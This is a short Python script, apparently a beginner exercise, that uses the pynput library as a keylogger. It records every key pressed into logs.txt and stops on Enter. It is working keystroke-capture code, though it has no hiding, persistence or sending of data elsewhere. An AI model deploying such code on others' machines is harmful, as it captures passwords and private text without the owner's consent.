from pynput.keyboard import Listener, Key

logger = []

def StoreKeys(key):
    logger.append(key)
    with open("logs.txt","w") as f:
        for i in logger:
            i = str(i)
            f.write(i)
# Stopping the key logger on pressing enter

def Halt(key):
    if key == Key.enter: 
        return False

# Creating and initialising a listener 

with Listener(on_press = StoreKeys, on_release = Halt) as listener:  
    listener.join()  



